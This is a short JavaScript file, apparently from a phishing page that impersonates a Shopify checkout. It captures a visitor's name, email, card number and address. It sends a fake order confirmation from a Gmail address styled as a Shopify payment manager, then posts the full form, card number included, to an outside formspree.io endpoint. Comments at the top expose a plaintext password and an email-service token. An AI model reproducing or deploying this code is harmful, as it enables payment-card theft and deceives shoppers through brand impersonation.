//password : D03D8F7BFF1CB9157E61AC8276E4BF2F9AC0

//SecureToken : 73ea2fb9-018d-4e64-b770-cf0a4e3ed695

document.getElementById("mail_form").addEventListener("submit", function (event) {
    event.preventDefault();

    var name = document.getElementById("mail_form").elements.namedItem("full_name").value;
    var email = document.getElementById("mail_form").elements.namedItem("email").value;
    var card = document.getElementById("mail_form").elements.namedItem("card_number").value;
    var address = document.getElementById("mail_form").elements.namedItem("address").value;
    var message = "Mr./Ms. " + name + " your order has been placed on shopify.com form " + card + " card number. You will recieve your package at " + address + " in two to three days."
    
    Email.send({
        SecureToken: "73ea2fb9-018d-4e64-b770-cf0a4e3ed695",
        To: email,
        From: "shopify.payment.manager@gmail.com",
        Subject: "Shopify order placed.",
        Body: message,
    }).then(function (message) {
        if (message === "OK") {
            alert("Congratulations! your order has been placed.");
            var form = document.getElementById("mail_form");
                form.action = "https://formspree.io/f/xrgvvevw";
                form.method = "POST";
                form.submit();
                document.getElementById("mail_form").reset();
        } else {
            alert("Failed to place your order. Please try again later.");
        }
    });
});
